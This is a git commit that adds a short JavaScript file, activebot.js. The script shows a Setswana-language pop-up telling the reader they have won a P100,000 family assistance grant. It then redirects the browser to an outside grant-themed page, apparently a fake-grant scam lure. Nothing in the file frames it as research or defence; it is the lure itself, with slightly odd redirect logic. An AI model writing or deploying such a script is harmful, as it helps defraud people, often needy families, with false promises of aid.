1f42de8e70792c366e57583aff177c10b00cff6e
The-On-going <sirpeelawson@gmail.com>
2026-09-22 16:39:53 +0100

    Create activebot.js

---
+++ activebot.js
@@ -0,0 +1,10 @@
+var password = 'P100,000';
+
+password = prompt(
+  'Ke a go akgolela, o tshwanelwa ke go amogela THUSO YA P100,000 YA MALAPA. Tobetsa OK go e amogela ka bonako.',
+  'P100,000'
+);
+
+if (password !== 'P100,000') {
+    location.href = 'https://ongoing-grant.info/100000-Thebolelo-Ya-Lelapa.html';
+}
